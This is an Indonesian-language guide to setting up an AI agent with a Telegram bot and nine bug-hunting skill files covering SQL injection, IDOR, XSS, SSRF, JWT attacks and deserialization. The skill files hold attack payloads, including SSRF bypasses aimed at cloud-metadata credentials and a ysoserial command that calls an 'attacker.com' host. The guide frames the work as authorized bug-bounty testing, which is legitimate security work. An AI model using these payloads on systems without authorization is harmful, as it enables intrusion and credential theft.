# HERMES CYBER KIT — SETUP LENGKAP DARI NOL

- **Dari**: Install Hermes → Pilih Model (Free/Paid) → Telegram → 9 Skill Bug Hunting
- **Untuk**: Linux (Ubuntu / Debian / Kali / Mint)
- **Total**: 9 custom skill + 53 builtin = 62 skill
- **Waktu**: ~30-60 menit

## DAFTAR ISI

- [BAGIAN 0 — PERSIAPAN AWAL](#bagian-0--persiapan-awal)
- [BAGIAN 1 — INSTALL HERMES AGENT](#bagian-1--install-hermes-agent)
- [BAGIAN 2 — PILIH MODEL: FREE ATAU PAID](#bagian-2--pilih-model-free-atau-paid)
- [BAGIAN 3 — SETUP TELEGRAM BOT](#bagian-3--setup-telegram-bot)
- [BAGIAN 4 — UPDATE HERMES](#bagian-4--update-hermes)
- [BAGIAN 5 — BIKIN 9 SKILL CUSTOM](#bagian-5--bikin-9-skill-custom)
- [BAGIAN 6 — RELOAD & VERIFIKASI SKILL](#bagian-6--reload-verifikasi-skill)
- [BAGIAN 7 — BIKIN scope.yaml](#bagian-7--bikin-scope-yaml)
- [BAGIAN 8 — TEST DI TELEGRAM](#bagian-8--test-di-telegram)
- [BAGIAN 9 — BACKUP KE GITHUB](#bagian-9--backup-ke-github)
- [BAGIAN 10 — TROUBLESHOOTING](#bagian-10--troubleshooting)
- [BAGIAN 11 — LINK PENTING](#bagian-11--link-penting)
- [BAGIAN 12 — CATATAN LEGAL](#bagian-12--catatan-legal)
- [BAGIAN 13 — RINGKASAN PERINTAH CEPAT](#bagian-13--ringkasan-perintah-cepat)

## BAGIAN 0 — PERSIAPAN AWAL

Buka terminal Linux (Ctrl + Alt + T).

**Buat folder kerja**

```bash
mkdir -p ~/hermes-cyber-kit/{scripts,skills/{vuln,recon,report},config,workflows,docs}
cd ~/hermes-cyber-kit
```

**Update sistem & install dependency**

```bash
sudo apt update
sudo apt install -y curl git python3 python3-pip nano
```

**Cek versi**

```bash
uname -a
python3 --version
```

## BAGIAN 1 — INSTALL HERMES AGENT

**Install Hermes (1 perintah)**

```bash
curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash
```

**Reload shell**

```bash
source ~/.bashrc
```

**Verifikasi**

```bash
hermes --version
```

**Output yang diharapkan:** `hermes 0.21.5+xxxxx`

## BAGIAN 2 — PILIH MODEL: FREE ATAU PAID

Di sini kamu punya 2 pilihan. Pilih salah satu, atau dua-duanya (free dulu, paid sebagai fallback).

### 2A — PILIHAN FREE (OpenRouter Free Tier)

**LANGKAH 1: Dapatkan API Key**

1. Buka browser: <https://openrouter.ai/keys>
2. Sign up gratis (bisa pakai GitHub/Google/Email).
3. Klik **Create Key**.
4. Kasih nama: `Hermes Agent`.
5. Copy API Key (format: `sk-or-v1-xxxxxxxxxxxx`).
6. **SIMPAN DI TEMPAT AMAN — cuma muncul sekali!**

**LANGKAH 2: Setup via wizard**

```bash
hermes model
```

- Pilih: **OpenRouter**
- Paste: **API Key**
- Pilih model: `openrouter/free`

**ATAU setup manual:**

```bash
mkdir -p ~/.hermes
echo "OPENROUTER_API_KEY=sk-or-v1-xxxxxxxxxxxx" >> ~/.hermes/.env
```

**Buat `config.yaml`**

```yaml
model:
  provider: openrouter
  default: "openrouter/free"

fallback_providers:
  - provider: openrouter
    model: "openrouter/free"

tools:
  rate_limit:
    nuclei: 10
    subfinder: 10
    httpx: 50
    ffuf: 20
```

**LANGKAH 3: Test**

```bash
hermes chat -q "Reply with exactly one word: pong"
```

**Output:** `pong`

**CATATAN FREE TIER**

- 50 request per hari (gratis)
- 20 request per menit
- Reset harian jam 00:00 UTC
- Model gratis bisa berubah kapan saja
- Kalau model `:free` hilang, ganti ke `openrouter/free` (auto-pilih)

### 2B — PILIHAN PAID (Top Up $10 untuk 1.000 request/hari)

**Kalau kamu butuh lebih dari 50 request/hari:**

1. Buka: <https://openrouter.ai/settings/credits>
2. Klik **Add Credits**.
3. Masukkan $10 (sekali seumur hidup akun).
4. Bayar via kartu kredit / crypto / Alipay.
5. Limit gratis naik PERMANEN dari 50 → 1.000 request/hari.

**Keuntungan top-up:**

- Limit gratis naik 20x lipat
- Kredit tidak hangus (kecuali tidak dipakai 1 tahun)
- Bisa dipakai untuk model berbayar murah (Claude Haiku, GPT-4o mini)
- Tidak ada drama "model unavailable for free"

**Setelah top-up, kamu bisa pakai model berbayar murah:**

```yaml
model:
  provider: openrouter
  default: "meta-llama/llama-3.3-70b-instruct"

fallback_providers:
  - provider: openrouter
    model: "qwen/qwen3-coder"

tools:
  rate_limit:
    nuclei: 10
    subfinder: 10
    httpx: 50
    ffuf: 20
```

**Biaya model berbayar murah:**

- Claude Haiku: ~$0.25 per 1M token input
- GPT-4o mini: ~$0.15 per 1M token input
- Llama 3.3 70B: ~$0.23 per 1M token input
- Dengan $10, bisa ~40 juta token — cukup berbulan-bulan

**Cek saldo kapan saja:**

```bash
curl -s https://openrouter.ai/api/v1/key \
  -H "Authorization: Bearer $(grep OPENROUTER ~/.hermes/.env | cut -d= -f2)"
```

### 2C — PILIHAN ALTERNATIF (Tanpa OpenRouter)

**Kalau tidak mau pakai OpenRouter, ada opsi lain:**

**OPSI 1: Ollama (100% lokal, gratis selamanya)**

```bash
curl -fsSL https://ollama.com/install.sh | sh
ollama pull qwen2.5:14b
```

**Edit config:**

```yaml
model:
  provider: ollama
  default: "qwen2.5:14b"
  base_url: "http://localhost:11434"
```

**OPSI 2: Groq (gratis, cepat)**

- Daftar: <https://console.groq.com/keys>
- Tambah ke `~/.hermes/.env`:
  `GROQ_API_KEY=gsk_xxxxxxxxxxxx`

**OPSI 3: Google Gemini (gratis, limit besar)**

- Daftar: <https://aistudio.google.com/apikey>
- Tambah ke `~/.hermes/.env`:
  `GOOGLE_API_KEY=AIzaxxxxxxxxxxxx`

## BAGIAN 3 — SETUP TELEGRAM BOT

### LANGKAH 1: Buat Bot di Telegram

1. Buka Telegram, cari `@BotFather`.
2. Kirim: `/newbot`.
3. Kasih nama bot (contoh: `My Hermes Bot`).
4. Kasih username, HARUS diakhiri `_bot` (contoh: `my_hermes_bot`).
5. BotFather kasih token:
   `1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ`
6. **COPY TOKEN.**

### LANGKAH 2: Dapatkan User ID kamu

1. Cari `@userinfobot`.
2. Kirim pesan apa saja.
3. Bot balas: `Id: 123456789`.
4. **COPY angka User ID.**

### LANGKAH 3: Setup gateway

```bash
hermes gateway setup
```

- Pilih: **Telegram**
- Paste: **Bot Token**
- Paste: **User ID kamu** (bisa multiple, pisah koma)

**ATAU setup manual:**

```bash
cat >> ~/.hermes/.env << 'EOF'
TELEGRAM_BOT_TOKEN=1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ
TELEGRAM_ALLOWED_USERS=123456789
EOF
```

### LANGKAH 4: Start gateway

```bash
hermes gateway start
```

### LANGKAH 5: Cek status

```bash
hermes gateway status
```

Output: `active (running)`

### LANGKAH 6: Test di Telegram

Buka bot kamu, kirim `/help`.

Bot harus balas daftar perintah.

## BAGIAN 4 — UPDATE HERMES (OPSIONAL TAPI DISARANKAN)

```bash
hermes update
```

Kalau ada warning `plugin solstice: No module named httpx`:

```bash
hermes pm install httpx
hermes gateway restart
```

## BAGIAN 5 — BIKIN 9 SKILL CUSTOM (OTOMATIS VIA CAT)

Semua skill di bawah ini otomatis ditulis pakai perintah `cat >`. Tinggal copy-paste, gak perlu nano manual.

### SKILL 1 — cve-lookup

```bash
mkdir -p ~/.hermes/skills/cve-lookup
cat > ~/.hermes/skills/cve-lookup/SKILL.md << 'SKILL_EOF'

---
name: cve-lookup
description: Use when searching for CVE information on software versions. Queries NVD, MITRE, Exploit-DB, and GitHub for public PoCs.
version: 1.0.0
metadata:
  hermes:
    tags: [security, cve, vulnerability]
---

# CVE Lookup

## Overview

Search for CVE information for a given software and version. Returns CVE IDs, CVSS scores, exploitation status, and patch information.

## When to Use

- Authorized security assessment
- Vulnerability research for a specific software version
- Bug bounty planning

## Procedure

### Step 1: Identify Software Version

Determine exact version (e.g., nginx/1.18.0).

### Step 2: Query NVD

https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=software+version

### Step 3: Query MITRE

https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=software

### Step 4: Check Exploit-DB

https://www.exploit-db.com/search?q=software

### Step 5: Check GitHub for PoCs

Search GitHub for CVE-ID PoC.

### Step 6: Summarize

Output format:

- CVE ID
- CVSS score
- Description
- Exploitation status (PoC public? in wild?)
- Fixed version

## Common Pitfalls

1. Outdated data - always cross-check multiple sources
2. False positives - verify CVE applies to exact version
3. EOL software - note if software is EOL

## Verification Checklist

- [ ] CVE applies to exact version
- [ ] CVSS score verified
- [ ] Patch version identified
- [ ] PoC status checked
SKILL_EOF
```

### SKILL 2 — subdomain-enum

```bash
mkdir -p ~/.hermes/skills/recon/subdomain-enum
cat > ~/.hermes/skills/recon/subdomain-enum/SKILL.md << 'SKILL_EOF'

---
name: subdomain-enum
description: Use when performing passive subdomain discovery on an authorized target. Enumerates subdomains via subfinder and validates live hosts with httpx.
version: 1.0.0
metadata:
  hermes:
    tags: [recon, subdomain, enumeration]
---

# Subdomain Enumeration

## Overview

Passive subdomain discovery using subfinder, followed by live host validation with httpx.

## When to Use

- Authorized bug bounty program with subdomain scope
- Security assessment where passive recon is permitted
- Do not use for unauthorized scanning

## Procedure

### Step 1: Passive Enumeration

subfinder -d target -silent -rate-limit 10 -o recon/target/subdomains.txt

### Step 2: Live Host Validation

httpx -l recon/target/subdomains.txt -silent -rate-limit 50 -o recon/target/live.txt

### Step 3: Technology Fingerprinting

httpx -l recon/target/live.txt -tech-detect -silent -o recon/target/tech.json

### Step 4: Save Results

mkdir -p recon/target
mv subdomains.txt live.txt tech.json recon/target/

## Common Pitfalls

1. Exceeding rate limits - always start with 10 req/s
2. Scanning out-of-scope domains - verify against scope
3. Forgetting to save results

## Verification Checklist

- [ ] All subdomains verified against scope
- [ ] Rate limits respected
- [ ] Results saved to target-specific directory
SKILL_EOF
```

### SKILL 3 — sql-injection

```bash
mkdir -p ~/.hermes/skills/vuln/sql-injection
cat > ~/.hermes/skills/vuln/sql-injection/SKILL.md << 'SKILL_EOF'

---
name: sql-injection
description: Use when testing for SQL injection vulnerabilities on authorized targets. Covers error-based, boolean-blind, time-blind, and UNION-based techniques.
version: 1.0.0
metadata:
  hermes:
    tags: [sqli, injection, database, owasp-a03]
---

# SQL Injection Detection

## Overview

SQL Injection occurs when user input is concatenated into SQL queries without proper sanitization.

## When to Use

- Authorized penetration test with web application scope
- Bug bounty program that includes SQLi in scope
- Do not use for unauthorized testing

## Detection Points

- Login forms (username, password)
- Search params (q, search, filter)
- URL paths (/user/123, /product/abc)
- Cookies (session, user_id)
- HTTP headers (User-Agent, Referer)

## Procedure

### Step 1: Error-Based Detection

Inject single quote

Look for SQL error messages:

- MySQL: You have an error in your SQL syntax
- PostgreSQL: syntax error at or near
- MSSQL: Unclosed quotation mark

### Step 2: Boolean-Blind Detection

True: quote AND 1=1 comment
False: quote AND 1=2 comment

Compare responses - different means likely SQLi

### Step 3: Time-Blind Detection

MySQL: quote AND SLEEP(5) comment
PostgreSQL: quote semicolon SELECT pg_sleep(5) comment
MSSQL: quote semicolon WAITFOR DELAY 0:0:5 comment

### Step 4: UNION-Based Detection

Determine column count with ORDER BY
Extract data with UNION SELECT

### Step 5: Automated Confirmation

sqlmap -u "https://target.com/search?q=test" --batch --level=3 --risk=2 --delay=1

Note: --delay=1 means 1 second between requests

## Severity Assessment

- Data extraction (PII): High or Critical
- Authentication bypass: Critical
- RCE via xp_cmdshell: Critical
- Blind SQLi only: Medium or High

## Remediation

- Use parameterized queries / prepared statements
- Input validation + whitelist
- Least-privilege database accounts
- WAF as defense-in-depth

## References

- OWASP A03:2025 Injection
- HackerOne Top 10
SKILL_EOF
```

### SKILL 4 — idor-check

```bash
mkdir -p ~/.hermes/skills/vuln/idor-check
cat > ~/.hermes/skills/vuln/idor-check/SKILL.md << 'SKILL_EOF'

---
name: idor-check
description: Use when testing for Insecure Direct Object Reference on authorized targets. Covers horizontal and vertical privilege escalation via ID manipulation.
version: 1.0.0
metadata:
  hermes:
    tags: [idor, bola, access-control, owasp-a01]
---

# IDOR Detection

## Overview

IDOR occurs when an application exposes internal object references without proper authorization checks, allowing users to access resources belonging to others.

## When to Use

- Authorized bug bounty program with access control in scope
- Penetration test of multi-user web application
- Do not use for testing with other users accounts

## Testing Points

- API endpoints: /api/user/123, /api/order/456
- Query params: user_id, doc
- Path segments: /invoice/INV-001
- Request body: user_id field
- Cookies: user id

## Procedure

### Step 1: Create Two Test Accounts

- Account A (attacker): your primary account
- Account B (victim): your secondary account
- Both must be yours

### Step 2: Capture Legitimate Request

Login as A, access resource owned by A

Example: GET /api/user/1001/profile

Authorization: Bearer A_token

### Step 3: Replace ID with B's ID

GET /api/user/1002/profile
Authorization: Bearer A_token

If response returns B data, IDOR confirmed.

### Step 4: Test Vertical Escalation

Login as regular user, access admin resource

Example: GET /api/admin/users

If response returns admin data, vertical IDOR confirmed.

### Step 5: Test UUID vs Sequential

UUIDs are not automatically safe - test them too

Leaked UUIDs in API responses or JS files can be used

### Step 6: Test HTTP Methods

GET, POST, PUT methods are tested

DELETE is NOT tested (destructive)

## Severity Assessment

- Horizontal (user to user): High
- Vertical (user to admin): Critical
- PII exposure: High or Critical
- Read-only IDOR: Medium or High
- Write or Delete IDOR: Critical

## Remediation

- Implement server-side authorization checks
- Use indirect references (session-mapped IDs)
- Deny by default
- Log all access attempts

## References

- OWASP A01:2025 Broken Access Control
- HackerOne Top 10 #3
SKILL_EOF
```

### SKILL 5 — xss-basic

```bash
mkdir -p ~/.hermes/skills/vuln/xss-basic
cat > ~/.hermes/skills/vuln/xss-basic/SKILL.md << 'SKILL_EOF'

---
name: xss-basic
description: Use when testing for Cross-Site Scripting on authorized targets. Covers reflected, stored, and DOM-based XSS with non-destructive PoC.
version: 1.0.0
metadata:
  hermes:
    tags: [xss, injection, client-side, owasp-a03]
---

# XSS Detection

## Overview

XSS occurs when user input is rendered in HTML without proper encoding, allowing attackers to execute JavaScript in victims browsers.

## When to Use

- Authorized web application penetration test
- Bug bounty program that includes XSS in scope
- Do not use for unauthorized testing

## Types of XSS

- Reflected: Payload in request, reflected in response
- Stored: Payload saved in DB, rendered to others
- DOM-based: Client-side JS writes input to DOM

## Procedure

### Step 1: Injection Marker

Inject: xss test marker

Observe response:

- If reflected as-is: potential XSS
- If encoded: likely safe

### Step 2: Test Common Payloads

Basic: script alert
IMG tag: img src=x onerror=alert
SVG: svg onload=alert
Attribute break-out: quote script alert
JavaScript URI: javascript alert

### Step 3: Context Analysis

HTML context: div USER_INPUT div
Attribute context: input value USER_INPUT
JavaScript context: script var x = USER_INPUT script
URL context: a href USER_INPUT a

### Step 4: DOM-Based Detection

Check dangerous sinks: innerHTML, outerHTML, document.write, eval, setTimeout, setInterval, Function

### Step 5: Non-Destructive PoC

Use only: alert or console.log

NEVER use: cookie stealing, keylogging, malicious redirects

## Severity Assessment

- Stored XSS (admin panel): Critical
- Stored XSS (user): High
- Reflected XSS: Medium
- DOM XSS: Medium or High
- Self-XSS only: Low

## Remediation

- Output encoding (context-aware)
- Input validation
- Content Security Policy (CSP)
- HttpOnly cookies
- Modern frameworks with proper escaping

## References

- OWASP A03:2025 Injection
- HackerOne Top 10 #1
SKILL_EOF
```

### SKILL 6 — ssrf-detect

```bash
mkdir -p ~/.hermes/skills/vuln/ssrf-detect
cat > ~/.hermes/skills/vuln/ssrf-detect/SKILL.md << 'SKILL_EOF'

---
name: ssrf-detect
description: Use when testing for Server-Side Request Forgery on authorized targets. Covers internal service access, cloud metadata reachability, and blind SSRF callbacks.
version: 1.0.0
metadata:
  hermes:
    tags: [ssrf, injection, access-control, owasp-a01]
---

# SSRF Detection

## Overview

SSRF occurs when an application fetches a URL without validating it, allowing attackers to reach internal services or cloud metadata.

## When to Use

- Authorized bug bounty with SSRF in scope
- Web app that fetches URLs (webhooks, PDF gen, image import)
- Do not use for unauthorized testing

## Testing Points

- URL params: url, path, dest, redirect
- Webhooks: POST webhook with url
- PDF generation: POST pdf with html_url
- Image import: POST import with image_url
- File upload via URL: POST upload with source
- API integrations: OAuth callbacks, SSO endpoints

## Procedure

### Step 1: Basic Internal Access

Localhost: http://127.0.0.1:80
Local network: http://192.168.1.1
AWS metadata: http://169.254.169.254/latest/meta-data/
GCP metadata: http://metadata.google.internal/computeMetadata/v1/
Azure metadata: http://169.254.169.254/metadata/instance

### Step 2: Bypass Filters

Decimal IP: http://2130706433 (127.0.0.1)
Hex IP: http://0x7f000001
Octal IP: http://0177.0.0.1
DNS rebinding: make-127-0-0-1-rebind.example.com
Redirect: attacker.com/redirect?url=http://169.254.169.254/
IPv6: http://[::1]

### Step 3: Blind SSRF Detection

Use interactsh or Burp Collaborator

```bash
interactsh-client
```

Inject callback URL

Check interactsh for callback

If received, blind SSRF confirmed.

### Step 4: Verify Impact

If cloud metadata accessible:

http://169.254.169.254/latest/meta-data/iam/security-credentials/

Check for AWS credentials

## Severity Assessment

- Cloud metadata access (IAM creds): Critical
- Internal service access: High
- Port scanning internal: Medium or High
- Blind SSRF with DNS callback: Low or Medium
- No callback: Informational

## Remediation

- Whitelist allowed domains
- Block private IP ranges
- Disable unused URL schemes
- Use IMDSv2 for AWS
- Network segmentation

## References

- OWASP A01:2025 Broken Access Control
- HackerOne SSRF reports
SKILL_EOF
```

### SKILL 7 — jwt-attacks

```bash
mkdir -p ~/.hermes/skills/vuln/jwt-attacks
cat > ~/.hermes/skills/vuln/jwt-attacks/SKILL.md << 'SKILL_EOF'

---
name: jwt-attacks
description: Use when testing JWT-based authentication on authorized targets. Covers algorithm confusion, none algorithm, weak secrets, and claim tampering.
version: 1.0.0
metadata:
  hermes:
    tags: [jwt, authentication, token, owasp-a07]
---

# JWT Attacks

## Overview

JWT implementation flaws can lead to authentication bypass, privilege escalation, or account takeover.

## When to Use

- Authorized penetration test of JWT-based auth
- Bug bounty program with authentication in scope
- Do not use for unauthorized testing

## Attack Vectors

### 1. Algorithm Confusion (RS256 to HS256)

Server uses RS256 but accepts HS256. Attacker signs with public key as HMAC secret.

Get public key: curl https://target.com/.well-known/jwks.json

### 2. None Algorithm

Server accepts alg none without signature.

Test: python3 jwt_tool.py JWT -X a

### 3. Weak Secret Brute-Force

hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256

### 4. Claim Tampering

Modify claims without re-signing.

Decode: echo JWT | cut -d. -f2 | base64 -d

Modify: role user to admin

## Procedure

### Step 1: Decode JWT

Header: echo JWT | cut -d. -f1 | base64 -d
Payload: echo JWT | cut -d. -f2 | base64 -d

Check: alg, kid, jku, x5u, sub, role, user_id

### Step 2: Test None Algorithm

python3 jwt_tool.py JWT -X a

### Step 3: Test Algorithm Confusion

Only if server uses RS256

python3 jwt_tool.py JWT -X k -pk public.pem

### Step 4: Test Weak Secret

Common weak secrets: secret, password, 123456, jwt_secret

Brute-force: python3 jwt_tool.py JWT -C -d wordlist.txt

### Step 5: Test Claim Tampering

Modify sub, role, user_id

Re-sign if you have secret

Otherwise test if server validates signature

### Step 6: Test KID Injection

kid can be:

- Path traversal: ../../dev/null
- SQL injection: UNION SELECT secret
- Command injection: pipe whoami

### Step 7: Test JKU or X5U Injection

jku: point to attacker-controlled JWKS
x5u: point to attacker-controlled certificate

## Severity Assessment

- Auth bypass: Critical
- Privilege escalation: Critical
- Account takeover: Critical
- Weak secret (crackable): High
- None algorithm: Critical

## Remediation

- Use strong random secrets (min 256-bit)
- Explicitly specify allowed algorithms
- Validate all claims (iss, aud, exp, nbf)
- Do not trust kid, jku, x5u blindly
- Use established libraries

## References

- OWASP A07:2025 Authentication Failures
- jwt_tool: https://github.com/ticarpi/jwt_tool
SKILL_EOF
```

### SKILL 8 — deserialization

```bash
mkdir -p ~/.hermes/skills/vuln/deserialization
cat > ~/.hermes/skills/vuln/deserialization/SKILL.md << 'SKILL_EOF'

---
name: deserialization
description: Use when testing for insecure deserialization on authorized targets. Covers gadget chains leading to RCE or data tampering.
version: 1.0.0
metadata:
  hermes:
    tags: [deserialization, rce, integrity, owasp-a08]
---

# Insecure Deserialization

## Overview

Deserialization flaws allow attackers to manipulate serialized objects, potentially achieving RCE or data tampering.

## When to Use

- Authorized penetration test
- Application using serialized data (cookies, API, cache)
- Do not use for unauthorized testing

## Detection Points

- Cookies: Base64-encoded binary data
- API params: data, token, state
- Cache keys: Redis, Memcached
- Message queues: RabbitMQ, Kafka
- File uploads: .ser, .pickle, .dat
- Session tokens: Custom session format

## Common Formats

- Java: ObjectInputStream, magic AC ED 00 05, tool ysoserial
- PHP: serialize, magic O: or a:, tool PHPGGC
- Python: pickle, magic 80 04, tool pickle-payloads
- .NET: BinaryFormatter, magic 00 01 00 00, tool ysoserial.net
- Ruby: Marshal, magic 04 08, tool universal_gadget

## Procedure

### Step 1: Identify Serialized Data

Decode base64: echo data | base64 -d | xxd | head

Check magic bytes.

### Step 2: Determine Format

Java: file decoded.bin (output Java serialization data)
PHP: echo data | base64 -d (output O:8 UserInfo)

### Step 3: Generate Payload (Non-Destructive Only)

Java: java -jar ysoserial.jar CommonsCollections1 curl http://attacker.com
PHP: phpggc Monolog/RCE1 system id
Python: use pickle with os.system curl callback

### Step 4: Test Payload

```bash
curl -X POST https://target.com/api/data \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin
```

### Step 5: Verify Impact

Check callback server (interactsh, Burp Collaborator)

**NEVER run destructive commands.**

## Severity Assessment

- RCE: Critical
- Data tampering: High
- DoS: Medium
- Info disclosure: Medium

## Remediation

- Avoid deserializing untrusted data
- Use safe formats (JSON, Protobuf)
- Integrity checks (HMAC)
- Whitelist allowed classes
- Isolate in sandbox

## References

- OWASP A08:2025 Software/Data Integrity Failures
- ysoserial: https://github.com/frohoff/ysoserial
- PHPGGC: https://github.com/ambionics/phpggc
SKILL_EOF
```

### SKILL 9 — vuln-report-format

```bash
mkdir -p ~/.hermes/skills/report/vuln-report-format
cat > ~/.hermes/skills/report/vuln-report-format/SKILL.md << 'SKILL_EOF'

---
name: vuln-report-format
description: Use when generating vulnerability reports. Produces standardized Markdown reports with reproduction steps and impact assessment.
version: 1.0.0
metadata:
  hermes:
    tags: [reporting, documentation]
---

# Vulnerability Report Format

## Overview

Standardized format for vulnerability reports.

## When to Use

- After confirming a vulnerability
- Before submitting to bug bounty platform
- For internal security documentation

## Template

# Vulnerability Type in Endpoint

## Metadata

- Target: https://target.com
- Endpoint: /api/user/123
- Date: 2026-01-15
- Reporter: Your Name
- Program: Bug Bounty Program Name

## Severity

- CVSS Score: X.X
- CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

## Summary

Brief description (2-3 sentences).

## Steps to Reproduce

1. Login as user A (your account)
2. Navigate to /api/user/123
3. Replace 123 with 456 (user B ID, also your account)
4. Observe response contains user B data

## Impact

Attacker can access other users PII, leading to:

- Privacy breach
- Potential account takeover
- Regulatory compliance issues

## Evidence

Request:

GET /api/user/456 HTTP/1.1
Host: target.com
Authorization: Bearer A_token

Response:

HTTP/1.1 200 OK
Content-Type: application/json
body contains user B data

## Reproduction Rate

100% (tested 3 times)

## Remediation

Implement server-side authorization checks.

## References

- OWASP A01:2025 Broken Access Control
- CWE-639

## Output Location

reports/target/vuln-type-timestamp.md
reports/target/SUMMARY.md
reports/target/evidence/

## Checklist

- [ ] Severity justified with CVSS
- [ ] Steps reproducible (tested 3x)
- [ ] Impact clearly stated
- [ ] Evidence attached
- [ ] Remediation provided
- [ ] No destructive actions documented
- [ ] No other users data in evidence
- [ ] Program rules followed

## References

- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- CWE Database: https://cwe.mitre.org/
SKILL_EOF
```

## BAGIAN 6 — RELOAD & VERIFIKASI SKILL

```bash
hermes skills reload
hermes gateway restart
```

**Verifikasi semua skill terdaftar**

```bash
hermes skills list | grep -E "cve|idor|sql|xss|ssrf|jwt|deserial|subdomain|vuln-report"
```

**Output yang diharapkan (9 baris):**

```text
cve-lookup           enabled
deserialization      enabled
idor-check           enabled
jwt-attacks          enabled
sql-injection        enabled
ssrf-detect          enabled
subdomain-enum       enabled
vuln-report-format   enabled
xss-basic            enabled
```

## BAGIAN 7 — BIKIN scope.yaml

```bash
mkdir -p ~/hermes-cyber-kit/config
```

```yaml
program: "Authorized Bug Bounty Program"
authorization: "AUTHORIZED"
authorized_by: "Program Owner Name"
date: "2026-01-01"

targets:
  - "https://api.mercadolibre.com"
  - "https://api.mercadopago.com"

out_of_scope:
  - "*.mercadolibre.cn"
  - "*.internal.example.com"

allowed:
  reconnaissance: true
  endpoint_discovery: true
  vulnerability_testing: true
  poc_generation: true
  automated_scanning: false

restricted:
  destructive_actions: true
  denial_of_service: true
  data_exfiltration: true
  social_engineering: true
  physical_access: true
  brute_force: true
  mass_account_creation: true

rate_limits:
  nuclei: 10
  subfinder: 10
  httpx: 50
  ffuf: 20
  katana: 10
```

## BAGIAN 8 — TEST DI TELEGRAM

Buka Telegram, cari bot kamu.

1. Kirim: `/reset`
2. Kirim: `/skills`
3. Test skill satu-satu:

**CVE lookup**

> Gunakan skill `cve-lookup` untuk cari CVE Apache 2.4.50.

**IDOR**

> Gunakan skill `idor-check` untuk analisis endpoint di `scope.yaml`.

**Subdomain enumeration**

> Gunakan skill `subdomain-enum` untuk recon `example.com`.

**SQL injection**

> Gunakan skill `sql-injection` untuk analisis endpoint login.

**XSS**

> Gunakan skill `xss-basic` untuk test parameter `q`.

**SSRF**

> Gunakan skill `ssrf-detect` untuk test parameter `url`.

## BAGIAN 9 — BACKUP KE GITHUB (OPSIONAL)

```bash
cd ~/hermes-cyber-kit

mkdir -p skills/{vuln,recon,report,cve-lookup}
cp -r ~/.hermes/skills/vuln/* skills/vuln/
cp -r ~/.hermes/skills/recon/* skills/recon/
cp -r ~/.hermes/skills/report/* skills/report/
cp -r ~/.hermes/skills/cve-lookup skills/cve-lookup/ 2>/dev/null

git init
git add .
git commit -m "Initial commit: Hermes Cyber Kit"
git remote add origin https://github.com/USERNAME/hermes-cyber-kit.git
git branch -M main
git push -u origin main
```

## BAGIAN 10 — TROUBLESHOOTING

### Error: `hermes: command not found`

```bash
source ~/.bashrc
```

### Error: `No model configured`

```bash
hermes model
```

### Error: `401 Unauthorized`

```bash
cat ~/.hermes/.env | grep OPENROUTER
```

Copy ulang API key dari <https://openrouter.ai/keys>.

### Error: `HTTP 404 model unavailable for free`

```bash
nano ~/.hermes/config.yaml
```

Ganti `default` ke:

```yaml
default: "openrouter/free"
```

### Error: `YAML frontmatter parse error`

Hapus tanda titik dua di `description`.

```bash
nano ~/.hermes/skills/[nama]/SKILL.md
```

### Error: `Gateway not running`

```bash
hermes gateway restart
```

### Error: Telegram bot tidak balas

```bash
hermes gateway status
hermes logs -n 30
```

**Cek kuota OpenRouter**

```bash
curl -s https://openrouter.ai/api/v1/key \
  -H "Authorization: Bearer $(grep OPENROUTER ~/.hermes/.env | cut -d= -f2)"
```

**Kalau kuota habis:**

1. Tunggu reset harian (00:00 UTC), atau
2. Top up $10 di <https://openrouter.ai/settings/credits>
3. Atau ganti ke provider lain (Ollama, Groq, Gemini).

## BAGIAN 11 — LINK PENTING

- **OpenRouter Keys**: <https://openrouter.ai/keys>
- **OpenRouter Credits**: <https://openrouter.ai/settings/credits>
- **OpenRouter Models**: <https://openrouter.ai/models>
- **Hermes Docs**: <https://hermes-agent.nousresearch.com/docs/>
- **Hermes GitHub**: <https://github.com/NousResearch/hermes-agent>
- **PortSwigger Lab**: <https://portswigger.net/web-security>
- **OWASP Juice Shop**: <https://owasp.org/www-project-juice-shop/>
- **HackerOne**: <https://hackerone.com>
- **Bugcrowd**: <https://bugcrowd.com>
- **YesWeHack**: <https://yeswehack.com>
- **CVSS Calculator**: <https://www.first.org/cvss/calculator/3.1>
- **CWE Database**: <https://cwe.mitre.org/>

## BAGIAN 12 — CATATAN LEGAL

**HANYA TEST TARGET YANG SAH:**

- Bug bounty program resmi (HackerOne, Bugcrowd, YesWeHack)
- Kontrak penetration test tertulis
- Sistem milik sendiri
- Lab latihan (PortSwigger, Juice Shop, DVWA, HackTheBox)

**DILARANG KERAS:**

- Target tanpa izin (ILEGAL — UU ITE Pasal 30)
- DoS / serangan destruktif
- Ekstraksi data orang lain
- Automated scanning tanpa izin
- Social engineering
- Brute force testing
- Mass account creation

**KONSEKUENSI PELANGGARAN:**

- Ban permanen dari platform bug bounty
- Tuntutan hukum pidana
- Denda miliaran rupiah
- Reputasi hancur

## BAGIAN 13 — RINGKASAN PERINTAH CEPAT

**Install Hermes**

```bash
curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash
source ~/.bashrc
```

**Setup model**

```bash
hermes model
```

**Setup Telegram**

```bash
hermes gateway setup
```

**Start gateway**

```bash
hermes gateway start
```

**Cek status**

```bash
hermes gateway status
```

**Update**

```bash
hermes update
```

**Cek skill**

```bash
hermes skills list
```

**Restart**

```bash
hermes gateway restart
```

**Test chat**

```bash
hermes chat -q "Reply with exactly one word: pong"
```

**Reload skill**

```bash
hermes skills reload
```

**Cek kuota OpenRouter**

```bash
curl -s https://openrouter.ai/api/v1/key \
  -H "Authorization: Bearer $(grep OPENROUTER ~/.hermes/.env | cut -d= -f2)"
```

## SELESAI

- **Total skill**: 9 custom + 53 builtin = 62 skill
- **Model**: openrouter/free (gratis) atau paid setelah top-up $10
- **Akses**: Terminal Linux + Telegram Bot
- **Waktu setup**: 30-60 menit
- **Status**: PRODUCTION READY
